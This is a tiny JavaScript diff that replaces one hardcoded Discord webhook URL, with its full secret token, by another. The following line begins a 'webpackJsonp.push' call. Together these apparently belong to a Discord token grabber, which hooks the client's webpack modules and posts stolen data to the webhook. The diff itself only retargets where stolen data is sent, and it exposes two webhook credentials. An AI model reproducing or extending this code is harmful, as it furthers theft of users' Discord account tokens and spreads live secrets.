@@ -1,4 +1,4 @@
-const webhookurl = 'https://discord.com/api/webhooks/859471739650048020/dMTqVB5hPP0VYWgmuctx6qQJhDUfQg5JA1zxaBezJFyU4g9i_NNNnF2WEdxAG-AVzghs';
+const webhookurl = 'https://discord.com/api/webhooks/859920158050877520/c9u32Tc9kpAHjKHUd0g1hW6MIYvgdkHAl6-FBELD5RdOT8QH6G2_OkD_O9GZ2pOumDPj';
 
 var req = webpackJsonp.push([
     [], {
